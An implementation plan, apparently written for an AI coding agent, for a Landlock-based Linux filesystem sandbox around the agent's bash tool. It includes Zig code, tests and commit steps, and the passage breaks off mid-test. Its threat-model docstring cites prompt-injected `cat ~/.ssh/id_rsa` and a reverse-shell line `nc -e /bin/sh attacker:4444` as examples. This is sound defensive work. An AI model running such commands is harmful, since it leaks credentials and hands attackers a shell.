# Bash Tool Linux Sandbox Plan (Phase B, 2026-05-15)

> **For Claude:** REQUIRED SUB-SKILL: Use `superpowers:executing-plans` to implement this plan task-by-task. Each task is one commit. Follow TDD for every task: write the failing test, watch it fail for the right reason, implement, watch it pass, commit.

**Goal.** Match the macOS bash sandbox (`docs/plans/archive/2026-05-07-bash-sandbox.md`) on Linux using the kernel Landlock LSM. Prompt-injected `cat ~/.ssh/id_rsa` must fail at the kernel boundary on Linux just as it does on macOS, with no external binary dependency (no `bwrap`, no `firejail`, no setuid).

**Architecture.** Same conceptual shape as macOS, different helper:

```
macOS:  /usr/bin/sandbox-exec -p <profile> /bin/sh -c <cmd>
Linux:  /proc/self/exe --__sandbox-helper <cwd> <home> -- /bin/sh -c <cmd>
```

The Linux helper is the same `zag` binary re-invoked with a magic first argument. `main.zig` detects the flag before any normal startup, installs Landlock, then `execve`s into the tail command. Inheritance of Landlock rules across `execve` is exactly what the kernel guarantees.

**Scope.** Filesystem only:

- Filesystem deny via Landlock (kernel >= 5.13).
- Permissive opt-out via the existing `zag.set_bash_sandbox_level("permissive")` Lua setter; no new Lua surface.
- Kernels without Landlock (CONFIG_SECURITY_LANDLOCK=n, or lsm= excludes landlock, or kernel < 5.13) fall back to unsandboxed with a `log.warn` line, matching today's behaviour on Linux.
- **Out of scope: network containment.** Landlock 5.13 has no network primitives; 6.7 adds `LANDLOCK_ACCESS_NET_*` but Ubuntu 22.04 LTS (5.15) and a meaningful share of users would be excluded. The threat-model docstring is updated to call out the Linux-vs-macOS gap; a follow-up plan adds either seccomp-bpf or kernel-6.7 net rules.

**Tech stack.** Zig 0.15.2. Three raw syscalls via `std.os.linux.syscall3`, no third-party dependency, no C interop. Total new code: ~250 LOC across two new files plus ~80 LOC of edits in `bash.zig`/`main.zig`.

---

## Ground rules

1. TDD every task.
2. One task = one commit.
3. `zig build test` green between commits.
4. `zig fmt --check .` before every commit.
5. Edit discipline: fully qualified absolute paths, verify via `git diff` before commit.
6. No em dashes, no hyphens-as-dashes.
7. Platform-sensitive: every change compiles on macOS and Linux. Use `@import("builtin").os.tag`. Files named `*_linux.zig` follow the prevailing repo pattern of in-file runtime gates (`if (builtin.os.tag != .linux) return error.Unsupported;`), not whole-file `@compileError` guards. See `src/Terminal.zig:260`, `src/oauth.zig:1141`, `src/tools/bash.zig:91` for examples.
8. Commit footer: `Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>`.

---

## Threat-model update

The docstring at `src/tools/bash.zig:1-28` claims "Linux: not yet sandboxed (see Phase B bubblewrap plan)". That bullet is wrong on two counts: Phase B is no longer bubblewrap, and after this plan ships Linux *is* sandboxed for filesystem. The threat-model bullets also overclaim network coverage as universal when it is in fact macOS-only.

Rewrite the platform paragraph and the network bullet. Concrete diff is in Task 1.

---

## Task 1: Update threat-model docstring

**Files:**
- Modify: `src/tools/bash.zig:1-28` (the `//!` block).

**Step 1: Replace the platform paragraph and network bullet**

Current (`src/tools/bash.zig:13-19`):

```zig
//! * Network tunneling: outbound network denied except loopback.
//!
//! Platform support:
//! * macOS: sandbox-exec with a generated seatbelt profile (see
//!   buildSeatbeltProfile).
//! * Linux: not yet sandboxed (see Phase B bubblewrap plan). Bash runs
//!   unconfined; users on Linux must trust their agent prompts.
```

Replace with:

```zig
//! * Network tunneling: outbound network denied except loopback on macOS.
//!   Not enforced on Linux until landlock >= 6.7 or a seccomp companion
//!   lands; see "Network gap" below.
//!
//! Platform support:
//! * macOS: sandbox-exec with a generated seatbelt profile (see
//!   buildSeatbeltProfile).
//! * Linux: kernel Landlock LSM, filesystem-only. Installed by a
//!   self-re-exec helper (see sandbox/helper_linux.zig). Kernels < 5.13
//!   or with Landlock disabled at boot fall back to unsandboxed with
//!   a logged warning. Network coverage is the documented gap.
//! * Other platforms: unsandboxed with a logged warning.
//!
//! Network gap (Linux): a prompt-injected `nc -e /bin/sh attacker:4444`
//! is not blocked by Landlock 5.13. Future Phase C will close this via
//! either seccomp-bpf connect() filtering or Landlock 6.7 net rules.
```

**Step 2: Commit**

```bash
git add src/tools/bash.zig
git commit -m "$(cat <<'EOF'
tools/bash: update threat model for Linux landlock sandbox

Phase B is landlock, not bubblewrap. Filesystem only; network
containment is the documented gap until Phase C lands seccomp or
landlock-6.7 net rules. Old kernels still fall back to unsandboxed.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 2: Add `src/sandbox/landlock_linux.zig`

The module that wraps the three Landlock syscalls and the read/write/execute allow-list. Compiled on every target; non-Linux callers receive `error.Unsupported` at runtime.

**Files:**
- Create: `src/sandbox/landlock_linux.zig`.

**Background facts the implementer needs.** Verified against the kernel sources and `landlock(7)` man page:

- Syscall numbers (x86_64 and aarch64 alike, generic table): `landlock_create_ruleset = 444`, `landlock_add_rule = 445`, `landlock_restrict_self = 446`. Zig 0.15.2 std exposes these as `SYS.landlock_create_ruleset` etc. (verified at `/opt/homebrew/Cellar/zig/0.15.2_1/lib/zig/std/os/linux/syscalls.zig:439-441` for x86_64 and similar offsets for other archs).
- ABI versions: 1=5.13 (base), 2=5.19 (REFER), 3=6.2 (TRUNCATE), 4=6.7 (NET), 5=6.10 (IOCTL_DEV), 6=6.12 (scoped), 7+ recent.
- Version probe: `landlock_create_ruleset(NULL, 0, LANDLOCK_CREATE_RULESET_VERSION)` returns the highest supported ABI as a positive int; otherwise errno indicates the failure class.
- `LANDLOCK_CREATE_RULESET_VERSION = 1 << 0`.
- `prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)` is required before `landlock_restrict_self` unless the caller has `CAP_SYS_ADMIN`. `PR_SET_NO_NEW_PRIVS = 38`.
- `landlock_ruleset_attr` is three `__u64`s today (24 bytes total): `handled_access_fs`, `handled_access_net`, `scoped`. The kernel uses `copy_struct_from_user`, so it accepts a struct of any size that matches a known version, with trailing unknown fields zeroed.
- `landlock_path_beneath_attr` is `__attribute__((packed))`: `__u64 allowed_access; __s32 parent_fd;` total 12 bytes. The natural Zig `extern struct` layout would add 4 bytes of trailing padding; we must use `align(1)` per field and `comptime` assert `@sizeOf == 12`.
- Path fds are opened with `O_PATH | O_CLOEXEC`. Missing paths (`ENOENT`) are skipped silently; the rule simply isn't added.
- Error semantics: `ENOSYS` = landlock not compiled in; `EOPNOTSUPP` = compiled but disabled at boot.

**Step 1: Write failing unit tests** (append to the new file):

```zig
test "landlock_path_beneath_attr is 12 bytes packed" {
    if (builtin.os.tag != .linux) return error.SkipZigTest;
    try std.testing.expectEqual(@as(usize, 12), @sizeOf(PathBeneathAttr));
}

test "downgrade masks REFER on ABI 1" {
    var attr: RulesetAttr = .{
        .handled_access_fs = Access.all_known_fs,
        .handled_access_net = 0,
        .scoped = 0,
    };
    downgradeForAbi(&attr, 1);
    try std.testing.expectEqual(@as(u64, 0), attr.handled_access_fs & Access.REFER);
    try std.testing.expectEqual(@as(u64, 0), attr.handled_access_fs & Access.TRUNCATE);
    try std.testing.expectEqual(@as(u64, 0), attr.handled_access_fs & Access.IOCTL_DEV);
}

test "downgrade keeps TRUNCATE on ABI 3" {
    var attr: RulesetAttr = .{
        .handled_access_fs = Access.all_known_fs,
        .handled_access_net = 0,
        .scoped = 0,
    };
    downgradeForAbi(&attr, 3);
    try std.testing.expect((attr.handled_access_fs & Access.TRUNCATE) != 0);
    try std.testing.expectEqual(@as(u64, 0), attr.handled_access_fs & Access.IOCTL_DEV);
}

test "probeAbi returns positive int or .Unsupported" {
    if (builtin.os.tag != .linux) return error.SkipZigTest;
    const r = probeAbi();
    switch (r) {
        .supported => |v| try std.testing.expect(v >= 1),
        .unsupported => {}, // kernel < 5.13 or disabled at boot; both valid
    }
}
```

**Step 2: Implement the module**

```zig
//! Linux Landlock LSM bindings: three syscalls + a small policy applier.
//!
//! Used by sandbox/helper_linux.zig from inside the post-fork pre-exec
//! window. The helper builds a ruleset granting reads on system dirs +
//! cwd, writes on cwd + /tmp + a handful of /dev sinks, exec on /usr,
//! /bin, /sbin, /opt, then calls applyRuleset which restricts the
//! current process (and every child after execve) to that ruleset.
//!
//! Forward-compat strategy: pass the full 24-byte ruleset_attr struct
//! with newer fields zeroed; the kernel uses copy_struct_from_user
//! semantics and accepts a larger-than-known struct iff the trailing
//! bytes are zero. Mask handled_access_fs to bits the running ABI
//! actually supports so the create_ruleset call doesn't EINVAL.

const std = @import("std");
const builtin = @import("builtin");
const linux = std.os.linux;
const log = std.log.scoped(.sandbox_landlock);

// --- Constants ---

pub const LANDLOCK_CREATE_RULESET_VERSION: u32 = 1 << 0;

pub const Access = struct {
    pub const EXECUTE: u64     = 1 << 0;
    pub const WRITE_FILE: u64  = 1 << 1;
    pub const READ_FILE: u64   = 1 << 2;
    pub const READ_DIR: u64    = 1 << 3;
    pub const REMOVE_DIR: u64  = 1 << 4;
    pub const REMOVE_FILE: u64 = 1 << 5;
    pub const MAKE_CHAR: u64   = 1 << 6;
    pub const MAKE_DIR: u64    = 1 << 7;
    pub const MAKE_REG: u64    = 1 << 8;
    pub const MAKE_SOCK: u64   = 1 << 9;
    pub const MAKE_FIFO: u64   = 1 << 10;
    pub const MAKE_BLOCK: u64  = 1 << 11;
    pub const MAKE_SYM: u64    = 1 << 12;
    pub const REFER: u64       = 1 << 13; // ABI 2 (5.19)
    pub const TRUNCATE: u64    = 1 << 14; // ABI 3 (6.2)
    pub const IOCTL_DEV: u64   = 1 << 15; // ABI 5 (6.10)

    /// Union of every bit we know about. Used as the handled set; downgraded
    /// per ABI before passing to the kernel.
    pub const all_known_fs: u64 =
        EXECUTE | WRITE_FILE | READ_FILE | READ_DIR |
        REMOVE_DIR | REMOVE_FILE |
        MAKE_CHAR | MAKE_DIR | MAKE_REG | MAKE_SOCK |
        MAKE_FIFO | MAKE_BLOCK | MAKE_SYM |
        REFER | TRUNCATE | IOCTL_DEV;
};

pub const RulesetAttr = extern struct {
    handled_access_fs: u64,
    handled_access_net: u64 = 0,
    scoped: u64 = 0,
};

pub const PathBeneathAttr = extern struct {
    allowed_access: u64 align(1),
    parent_fd: i32 align(1),
};

const RuleType = enum(u32) {
    path_beneath = 1,
};

// --- Syscall wrappers ---

fn createRuleset(attr: ?*const RulesetAttr, size: usize, flags: u32) isize {
    return @bitCast(linux.syscall3(
        .landlock_create_ruleset,
        if (attr) |p| @intFromPtr(p) else 0,
        size,
        flags,
    ));
}

fn addRule(ruleset_fd: i32, rule_type: RuleType, attr_ptr: *const anyopaque, flags: u32) isize {
    // landlock_add_rule takes 4 args. We need syscall4 here.
    return @bitCast(linux.syscall4(
        .landlock_add_rule,
        @as(usize, @bitCast(@as(isize, ruleset_fd))),
        @intFromEnum(rule_type),
        @intFromPtr(attr_ptr),
        flags,
    ));
}

fn restrictSelf(ruleset_fd: i32, flags: u32) isize {
    return @bitCast(linux.syscall2(
        .landlock_restrict_self,
        @as(usize, @bitCast(@as(isize, ruleset_fd))),
        flags,
    ));
}

// --- Public API ---

pub const ProbeResult = union(enum) {
    supported: u32, // ABI version
    unsupported,
};

/// Probe the running kernel for landlock support and return the highest
/// supported ABI. Never panics; ENOSYS/EOPNOTSUPP both surface as
/// .unsupported and the caller should fall back to unsandboxed exec.
pub fn probeAbi() ProbeResult {
    const rc = createRuleset(null, 0, LANDLOCK_CREATE_RULESET_VERSION);
    if (rc >= 1) return .{ .supported = @intCast(rc) };
    return .unsupported;
}

/// Mask off access bits the running kernel does not know about, plus any
/// newer ruleset_attr fields the kernel cannot store. Mutates in place.
pub fn downgradeForAbi(attr: *RulesetAttr, abi: u32) void {
    // Drop bits introduced in ABIs newer than what the kernel speaks.
    if (abi < 5) attr.handled_access_fs &= ~Access.IOCTL_DEV;
    if (abi < 3) attr.handled_access_fs &= ~Access.TRUNCATE;
    if (abi < 2) attr.handled_access_fs &= ~Access.REFER;
    // Net + scoped fields zeroed for older ABIs (covered by the struct's
    // default-zero init but explicit here for the human reader).
    if (abi < 4) attr.handled_access_net = 0;
    if (abi < 6) attr.scoped = 0;
}

pub const ApplyError = error{
    Unsupported,            // landlock not in this kernel or disabled at boot
    RulesetCreateFailed,
    AddRuleFailed,
    PrctlFailed,
    RestrictSelfFailed,
};

pub const Inputs = struct {
    cwd: []const u8,
    home: []const u8, // unused today; reserved for future per-home rules
};

/// Install a Landlock ruleset for one sandboxed process. Must be called
/// after fork() and before execve(), on the child side. After return on
/// success, the calling thread (and all descendants after execve) are
/// restricted to the rules below.
///
/// The ruleset:
///   Read+ReadDir: /usr, /bin, /sbin, /lib, /lib32, /lib64, /etc, /opt,
///                 /dev, /proc, /sys, /tmp, /var/tmp, <cwd>
///   Write:        <cwd>, /tmp, /var/tmp, /dev/null, /dev/stdout,
///                 /dev/stderr, /dev/tty (last four as exact-file rules)
///   Execute:      /usr, /bin, /sbin, /opt, /lib, /lib32, /lib64
/// $HOME is intentionally NOT granted; secrets like ~/.ssh are denied
/// by absence. $PWD may live under $HOME and that's fine because path
/// rules are subtree-scoped.
pub fn applyRuleset(inputs: Inputs) ApplyError!void {
    if (builtin.os.tag != .linux) return error.Unsupported;

    const abi = switch (probeAbi()) {
        .supported => |v| v,
        .unsupported => return error.Unsupported,
    };

    var attr: RulesetAttr = .{ .handled_access_fs = Access.all_known_fs };
    downgradeForAbi(&attr, abi);

    const ruleset_fd_raw = createRuleset(&attr, @sizeOf(RulesetAttr), 0);
    if (ruleset_fd_raw < 0) {
        log.warn("landlock_create_ruleset failed: errno={d}", .{-ruleset_fd_raw});
        return error.RulesetCreateFailed;
    }
    const ruleset_fd: i32 = @intCast(ruleset_fd_raw);
    defer _ = linux.close(ruleset_fd);

    const read_dir_paths = [_][]const u8{
        "/usr", "/bin", "/sbin", "/lib", "/lib32", "/lib64",
        "/etc", "/opt", "/dev", "/proc", "/sys", "/tmp", "/var/tmp",
        inputs.cwd,
    };
    const read_access = Access.READ_FILE | Access.READ_DIR;
    try addPathRules(ruleset_fd, &read_dir_paths, read_access & attr.handled_access_fs);

    const write_subtree_paths = [_][]const u8{ inputs.cwd, "/tmp", "/var/tmp" };
    const write_subtree_access = (Access.WRITE_FILE | Access.READ_FILE |
        Access.READ_DIR | Access.REMOVE_FILE | Access.REMOVE_DIR |
        Access.MAKE_REG | Access.MAKE_DIR | Access.MAKE_FIFO |
        Access.MAKE_SOCK | Access.MAKE_SYM | Access.TRUNCATE) & attr.handled_access_fs;
    try addPathRules(ruleset_fd, &write_subtree_paths, write_subtree_access);

    const write_file_paths = [_][]const u8{
        "/dev/null", "/dev/stdout", "/dev/stderr", "/dev/tty",
    };
    try addPathRules(ruleset_fd, &write_file_paths, Access.WRITE_FILE & attr.handled_access_fs);

    const exec_paths = [_][]const u8{
        "/usr", "/bin", "/sbin", "/opt", "/lib", "/lib32", "/lib64",
    };
    try addPathRules(ruleset_fd, &exec_paths, Access.EXECUTE & attr.handled_access_fs);

    // PR_SET_NO_NEW_PRIVS must precede restrict_self for unprivileged callers.
    const prctl_rc = linux.prctl(.SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    if (@as(isize, @bitCast(prctl_rc)) < 0) {
        log.warn("prctl(PR_SET_NO_NEW_PRIVS) failed: errno={d}", .{-@as(isize, @bitCast(prctl_rc))});
        return error.PrctlFailed;
    }

    const rs_rc = restrictSelf(ruleset_fd, 0);
    if (rs_rc < 0) {
        log.warn("landlock_restrict_self failed: errno={d}", .{-rs_rc});
        return error.RestrictSelfFailed;
    }
}

fn addPathRules(ruleset_fd: i32, paths: []const []const u8, allowed_access: u64) ApplyError!void {
    if (allowed_access == 0) return; // every bit downgraded away; nothing to add.
    for (paths) |path| {
        var path_buf: [std.fs.max_path_bytes]u8 = undefined;
        if (path.len + 1 > path_buf.len) {
            log.warn("landlock: path too long, skipping: {s}", .{path});
            continue;
        }
        @memcpy(path_buf[0..path.len], path);
        path_buf[path.len] = 0;
        const path_z: [*:0]const u8 = @ptrCast(&path_buf);

        const fd_rc = linux.openat(
            linux.AT.FDCWD,
            path_z,
            .{ .PATH = true, .CLOEXEC = true },
            0,
        );
        const fd_signed: isize = @bitCast(fd_rc);
        if (fd_signed < 0) {
            // ENOENT, EACCES on a system without /lib32 etc. is expected;
            // skip the rule silently rather than fail the whole sandbox.
            continue;
        }
        const fd: i32 = @intCast(fd_signed);
        defer _ = linux.close(fd);

        const rule: PathBeneathAttr = .{
            .allowed_access = allowed_access,
            .parent_fd = fd,
        };
        const add_rc = addRule(ruleset_fd, .path_beneath, &rule, 0);
        if (add_rc < 0) {
            log.warn("landlock_add_rule({s}) failed: errno={d}", .{ path, -add_rc });
            return error.AddRuleFailed;
        }
    }
}

test {
    @import("std").testing.refAllDecls(@This());
}

// (unit tests above are inserted here in Step 1)
```

**API verification notes for the executor.** Before treating any of this as final, check:

1. `linux.syscall4` and `linux.syscall2` exist in Zig 0.15.2 (the std file at `/opt/homebrew/Cellar/zig/0.15.2_1/lib/zig/std/os/linux.zig:56-62` re-exports `syscall0..syscall6`). Use them as written.
2. `linux.prctl` signature in Zig 0.15.2. If the std prctl wrapper does not take the `PR_SET_NO_NEW_PRIVS` enum tag, fall back to a raw `syscall5(.prctl, 38, 1, 0, 0, 0)`. The semantic is identical.
3. `linux.openat` argument shape (flags struct vs. raw bitmask). Match the shape used elsewhere in the codebase if any; otherwise the raw-flags form `syscall4(.openat, AT_FDCWD, path_ptr, O_PATH | O_CLOEXEC, 0)` is the safe fallback.
4. `linux.AT.FDCWD` constant: if std exposes it as `AT.FDCWD`, use the dotted form; otherwise hardcode `-100`.
5. `comptime { std.debug.assert(@sizeOf(PathBeneathAttr) == 12); }` belongs at the top of the file as a sanity guard. If the assert fails, `align(1)` on the fields is not producing the expected layout and the struct needs `packed struct(u96)` instead.

**Step 3: Confirm tests pass on Linux, are skipped on macOS.** On macOS most of the unit tests skip via `error.SkipZigTest`; the downgrade-math tests run on every platform because they are pure logic.

**Step 4: Commit**

```bash
git add src/sandbox/landlock_linux.zig
git commit -m "$(cat <<'EOF'
sandbox: add landlock_linux module with syscall wrappers

Three raw syscalls (create_ruleset, add_rule, restrict_self), an ABI
probe, a downgrade ladder for bits the running kernel does not know,
and a fixed allow-list policy (read system dirs + cwd; write cwd +
/tmp + /dev sinks; execute /usr+/bin+/sbin+/opt+/lib*). Compiles on
every target; non-linux callers return error.Unsupported at runtime.

Not yet wired in. Next commit adds the self-re-exec helper that calls
applyRuleset between fork and exec.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 3: Add `src/sandbox/helper_linux.zig` and the main.zig branch

**Files:**
- Create: `src/sandbox/helper_linux.zig`.
- Modify: `src/main.zig` (add `builtin` import; insert magic-flag branch at the very top of `main()`; add transitive `_ = @import` lines in the test block at `:478-505`).

**Why a magic positional flag and not argv[0] dispatch.** Argv[0] is mangled by some shells, by `posix_spawn`, and by symlink rename. A magic argv[1] string is robust across PATH lookups and renames.

**Why `--__sandbox-helper` specifically.** Double-leading-underscore mirrors the Python "private" convention; a collision with a user-supplied first argument is implausible. The flag is never user-facing.

**Step 1: Write failing tests** (inside the new helper file):

```zig
test "parseArgs extracts cwd, home, and tail" {
    const argv = [_][:0]const u8{
        "zag", "--__sandbox-helper", "/tmp/work", "/home/u", "--",
        "/bin/sh", "-c", "echo hi",
    };
    const parsed = try parseArgs(&argv);
    try std.testing.expectEqualStrings("/tmp/work", parsed.cwd);
    try std.testing.expectEqualStrings("/home/u", parsed.home);
    try std.testing.expectEqual(@as(usize, 3), parsed.tail.len);
    try std.testing.expectEqualStrings("/bin/sh", parsed.tail[0]);
    try std.testing.expectEqualStrings("echo hi", parsed.tail[2]);
}

test "parseArgs rejects missing double-dash separator" {
    const argv = [_][:0]const u8{
        "zag", "--__sandbox-helper", "/tmp", "/home/u",
        "/bin/sh", "-c", "echo hi", // no "--" sentinel
    };
    try std.testing.expectError(error.MalformedArgs, parseArgs(&argv));
}

test "parseArgs rejects too-short argv" {
    const argv = [_][:0]const u8{ "zag", "--__sandbox-helper" };
    try std.testing.expectError(error.MalformedArgs, parseArgs(&argv));
}
```

**Step 2: Implement the helper**

```zig
//! Linux sandbox helper: invoked when zag's argv[1] is "--__sandbox-helper".
//! Installs landlock via sandbox/landlock_linux.zig, then execve's the
//! tail. Never returns on success; falls back to execve-without-sandbox
//! with a stderr warning on unsupported kernels (matches today's
//! "Linux falls back to unsandboxed" stance).

const std = @import("std");
const builtin = @import("builtin");
const linux = std.os.linux;
const landlock = @import("landlock_linux.zig");

pub const flag = "--__sandbox-helper";

pub const ParsedArgs = struct {
    cwd: [:0]const u8,
    home: [:0]const u8,
    tail: []const [:0]const u8,
};

pub const ParseError = error{MalformedArgs};

pub fn parseArgs(argv: []const [:0]const u8) ParseError!ParsedArgs {
    // Expected: [exe, flag, cwd, home, "--", tail0, tail1, ...]
    //            0     1    2    3    4    5+
    if (argv.len < 6) return error.MalformedArgs;
    if (!std.mem.eql(u8, argv[1], flag)) return error.MalformedArgs;
    if (!std.mem.eql(u8, argv[4], "--")) return error.MalformedArgs;
    return .{
        .cwd = argv[2],
        .home = argv[3],
        .tail = argv[5..],
    };
}

/// Entry called from main.zig before any normal startup. argv comes
/// directly from std.os.argv (no allocator dance needed). Never returns.
pub fn run(argv: []const [:0]const u8) noreturn {
    const parsed = parseArgs(argv) catch {
        std.debug.print("zag --__sandbox-helper: malformed argv\n", .{});
        std.process.exit(2);
    };

    landlock.applyRuleset(.{ .cwd = parsed.cwd, .home = parsed.home }) catch |err| switch (err) {
        error.Unsupported => {
            std.debug.print(
                "zag: bash sandbox unavailable on this kernel; running unconfined\n",
                .{},
            );
        },
        else => |e| {
            std.debug.print(
                "zag: bash sandbox setup failed ({s}); running unconfined\n",
                .{@errorName(e)},
            );
        },
    };

    execTail(parsed.tail);
}

fn execTail(tail: []const [:0]const u8) noreturn {
    // Build a [*:null]const ?[*:0]const u8 from the tail. Bounded stack
    // buffer keeps us out of allocator territory; if a real command needs
    // more than 128 argv entries we have bigger problems.
    var argv_buf: [129]?[*:0]const u8 = undefined;
    if (tail.len + 1 > argv_buf.len) {
        std.debug.print("zag --__sandbox-helper: tail argv too long\n", .{});
        std.process.exit(2);
    }
    for (tail, 0..) |a, i| argv_buf[i] = a.ptr;
    argv_buf[tail.len] = null;
    const argv_z: [*:null]const ?[*:0]const u8 = @ptrCast(&argv_buf);

    // Pass the parent's environ through unchanged; secrets in env are
    // already constrained by the file-read deny set landlock just
    // installed (anything that tries to load credentials from disk hits
    // EACCES). Filtering env is a separate concern from filesystem
    // scope; defer to a future plan if real leak vectors surface.
    const envp_z: [*:null]const ?[*:0]const u8 = @ptrCast(std.os.environ.ptr);

    const err = std.posix.execveZ(tail[0].ptr, argv_z, envp_z);
    std.debug.print("zag --__sandbox-helper: execve failed: {s}\n", .{@errorName(err)});
    std.process.exit(127);
}

test {
    @import("std").testing.refAllDecls(@This());
}

// (unit tests above are inserted here in Step 1)
```

**Step 3: Modify `src/main.zig`**

Two edits in `src/main.zig`:

1. At the top of the import block (the agent reported `main.zig` does not currently import `builtin`; verify and add if absent):

   ```zig
   const builtin = @import("builtin");
   ```

   Place adjacent to the existing top-of-file imports. If `builtin` is already imported, skip.

2. At the very first line of `pub fn main()` (currently line 110, before `var gpa = ...`):

   ```zig
   if (comptime builtin.os.tag == .linux) {
       const raw_argv = std.os.argv;
       if (raw_argv.len >= 2) {
           const arg1 = std.mem.span(raw_argv[1]);
           if (std.mem.eql(u8, arg1, sandbox_helper.flag)) {
               // Span every argv entry into [:0]const u8 then dispatch.
               var argv_list: [256][:0]const u8 = undefined;
               if (raw_argv.len > argv_list.len) {
                   std.debug.print("zag: argv too long for sandbox helper\n", .{});
                   std.process.exit(2);
               }
               for (raw_argv, 0..) |p, i| argv_list[i] = std.mem.span(p);
               sandbox_helper.run(argv_list[0..raw_argv.len]);
               // unreachable
           }
       }
   }
   ```

   With `const sandbox_helper = @import("sandbox/helper_linux.zig");` added near the other module imports. The `comptime` on `os.tag` ensures the entire branch is dead code on macOS/Windows; the import is still type-checked on every target (matching the codebase convention).

3. Add to the test block at `src/main.zig:478-505` (the explicit-import list):

   ```zig
   _ = @import("sandbox/landlock_linux.zig");
   _ = @import("sandbox/helper_linux.zig");
   ```

**Step 4: Confirm**

```
zig build test 2>&1 | rg "sandbox|landlock"
zig fmt --check .
```

On macOS the unit tests in `landlock_linux.zig` that touch the kernel skip; the pure-logic ones (downgrade math) run. The `parseArgs` tests in `helper_linux.zig` run on every platform.

**Step 5: Commit**

```bash
git add src/sandbox/helper_linux.zig src/main.zig
git commit -m "$(cat <<'EOF'
sandbox: add --__sandbox-helper self-re-exec entry on linux

main.zig detects --__sandbox-helper as argv[1] before any normal
startup and dispatches to sandbox/helper_linux.zig, which installs
landlock then execve's into the tail command. On macOS/Windows the
branch is comptime-dead.

The helper parses [exe, --__sandbox-helper, cwd, home, --, tail...]
and forwards the tail to execveZ. Malformed argv exits 2; landlock
unsupported logs a warning and execve's unconfined, matching today's
fallback stance.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 4: Wire the Linux branch in `tools/bash.zig`

**Files:**
- Modify: `src/tools/bash.zig` (lines 80-130: the `sandbox_blk` block and the matching free defer).

**Step 1: Refactor extraction (no behaviour change)**

Extract the existing macOS argv builder into a function so the platform branch is symmetric. Both functions return `[]const []const u8` over `allocator`; the caller frees through a unified helper.

New helpers near the existing `buildSeatbeltProfile`:

```zig
const SandboxPlatform = enum { macos, linux };

const SandboxArgv = struct {
    argv: []const []const u8,
    platform: SandboxPlatform,
};

fn buildMacosArgv(
    allocator: Allocator,
    cwd: []const u8,
    home: []const u8,
    command: []const u8,
) !SandboxArgv {
    const profile = try buildSeatbeltProfile(allocator, .{ .cwd = cwd, .home = home });
    errdefer allocator.free(profile);

    const argv = try allocator.alloc([]const u8, 6);
    errdefer allocator.free(argv);

    argv[0] = "/usr/bin/sandbox-exec";
    argv[1] = "-p";
    argv[2] = profile; // heap-owned; transferred ownership
    argv[3] = "/bin/sh";
    argv[4] = "-c";
    argv[5] = command;
    return .{ .argv = argv, .platform = .macos };
}

fn buildLinuxArgv(
    allocator: Allocator,
    cwd: []const u8,
    home: []const u8,
    command: []const u8,
) !SandboxArgv {
    var self_buf: [std.fs.max_path_bytes]u8 = undefined;
    const self_path = try std.fs.selfExePath(&self_buf);

    const self_owned = try allocator.dupe(u8, self_path);
    errdefer allocator.free(self_owned);
    const cwd_owned = try allocator.dupe(u8, cwd);
    errdefer allocator.free(cwd_owned);
    const home_owned = try allocator.dupe(u8, home);
    errdefer allocator.free(home_owned);

    const argv = try allocator.alloc([]const u8, 8);
    errdefer allocator.free(argv);

    argv[0] = self_owned;
    argv[1] = "--__sandbox-helper";
    argv[2] = cwd_owned;
    argv[3] = home_owned;
    argv[4] = "--";
    argv[5] = "/bin/sh";
    argv[6] = "-c";
    argv[7] = command;
    return .{ .argv = argv, .platform = .linux };
}

fn freeSandboxArgv(allocator: Allocator, sb: SandboxArgv) void {
    switch (sb.platform) {
        .macos => {
            allocator.free(sb.argv[2]); // duped seatbelt profile
        },
        .linux => {
            allocator.free(sb.argv[0]); // duped self_path
            allocator.free(sb.argv[2]); // duped cwd
            allocator.free(sb.argv[3]); // duped home
        },
    }
    allocator.free(sb.argv);
}
```

Note the slot ownership the agent confirmed at `src/tools/bash.zig:109-119`: macOS argv[5] borrows `input.command` from the JSON parsed tree (`parsed.deinit()` at line 77 frees it). The Linux argv[7] borrows the same. Neither builder duplicates `command`; the outer function's defer ordering keeps it alive.

**Step 2: Replace the inline block** (lines 80-130)

The new block:

```zig
const permissive = if (bound_config) |c| c.permissive else false;
const sandbox: ?SandboxArgv = sandbox_blk: {
    if (permissive) break :sandbox_blk null;

    const home = std.posix.getenv("HOME") orelse home_blk: {
        log.warn("HOME unset; sandbox secret-deny rules rooted at '/'", .{});
        break :home_blk "/";
    };
    var cwd_buf: [std.fs.max_path_bytes]u8 = undefined;
    const cwd = std.fs.cwd().realpath(".", &cwd_buf) catch |err| cwd_blk: {
        log.warn("realpath('.') failed ({s}); cwd write-scope rooted at '/'", .{@errorName(err)});
        break :cwd_blk "/";
    };

    break :sandbox_blk switch (builtin.os.tag) {
        .macos => buildMacosArgv(allocator, cwd, home, input.command) catch |err| {
            const msg = std.fmt.allocPrint(allocator, "error: failed to build macOS sandbox argv: {s}", .{@errorName(err)}) catch return types.oomResult();
            return .{ .content = msg, .is_error = true };
        },
        .linux => buildLinuxArgv(allocator, cwd, home, input.command) catch |err| {
            const msg = std.fmt.allocPrint(allocator, "error: failed to build linux sandbox argv: {s}", .{@errorName(err)}) catch return types.oomResult();
            return .{ .content = msg, .is_error = true };
        },
        else => null,
    };
};
defer if (sandbox) |sb| freeSandboxArgv(allocator, sb);

var child = if (sandbox) |sb|
    std.process.Child.init(sb.argv, allocator)
else
    std.process.Child.init(&.{ "/bin/sh", "-c", input.command }, allocator);
```

The rest of `execute` (pipe setup, `collectWithCancel`, `child.wait()`, output formatting) is unchanged. The defer ordering survives because the new `defer if (sandbox) ...` registers before `child.spawn()`, runs after `child.wait()` returns, and runs strictly before `parsed.deinit()` (the outer defer at line 77) which owns `input.command`.

**Step 3: Add Linux unit tests** (append to `src/tools/bash.zig` after the existing macOS profile tests around line 520):

```zig
test "buildLinuxArgv produces self-re-exec argv shape" {
    const allocator = std.testing.allocator;
    const sb = try buildLinuxArgv(allocator, "/tmp/work", "/home/u", "echo hi");
    defer freeSandboxArgv(allocator, sb);

    try std.testing.expectEqual(SandboxPlatform.linux, sb.platform);
    try std.testing.expectEqual(@as(usize, 8), sb.argv.len);
    try std.testing.expectEqualStrings("--__sandbox-helper", sb.argv[1]);
